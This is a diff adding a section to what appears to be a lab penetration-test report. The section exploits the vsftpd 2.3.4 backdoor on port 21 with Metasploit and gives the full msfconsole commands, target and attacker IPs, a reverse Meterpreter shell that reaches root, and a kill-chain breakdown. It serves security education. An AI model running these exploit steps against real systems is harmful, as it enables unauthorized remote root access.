@@ -39,3 +39,28 @@ Key findings — 23 open ports in total, including several with well-known vulne
 - **8009/tcp** - Apache JServ Protocol (AJP)
 - **8180/tcp** - Apache Tomcat/Coyote 1.1
 
+
+## Exploit 1: vsftpd 2.3.4 Backdoor
+
+- **Service / Port:** FTP / 21
+- **Vulnerability:** vsftpd 2.3.4 contains a maliciously inserted backdoor (CVE-2011-2523) that opens a command shell on port 6200 when a specific string is sent in the FTP username.
+- **Tool Used:** Metasploit — exploit/unix/ftp/vsftpd_234_backdoor
+- **Why This Tool:** The recon scan (nmap -sV) identified the exact vulnerable version (vsftpd 2.3.4) running on port 21. Metasploit has a dedicated, reliable ("excellent" rank) module specifically built for this known backdoor, making it the most direct and effective way to exploit it rather than manually crafting the backdoor trigger by hand.
+- **Steps:**
+  1. `msfconsole`
+  2. `search vsftpd`
+  3. `use exploit/unix/ftp/vsftpd_234_backdoor`
+  4. `set RHOSTS 192.168.100.204`
+  5. `set LHOST 192.168.100.253`
+  6. `run`
+  7. Confirmed access with `sysinfo` and `getuid` inside the resulting Meterpreter session
+- **Evidence:** evidence/exploit1.png
+- **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Installation, Command & Control, Actions on Objectives
+  - **Reconnaissance:** The nmap scan identified vsftpd 2.3.4 running on port 21.
+  - **Weaponization:** Selecting the vsftpd_234_backdoor module and configuring RHOSTS/LHOST paired the known vulnerability with a working payload.
+  - **Delivery:** Running the module sent the malicious FTP connection/trigger string to the target's FTP service.
+  - **Exploitation:** The backdoor was triggered, spawning a listening shell on the target.
+  - **Installation:** The Meterpreter payload was delivered and executed, establishing a foothold.
+  - **Command & Control:** The reverse TCP Meterpreter session gave an ongoing remote control channel back to Kali.
+  - **Actions on Objectives:** Ran sysinfo and getuid to confirm full root-level access to the target.
+- **Outcome / Impact:** Achieved a root-level Meterpreter session on the target with no authentication required — full compromise of the system via a single FTP connection.
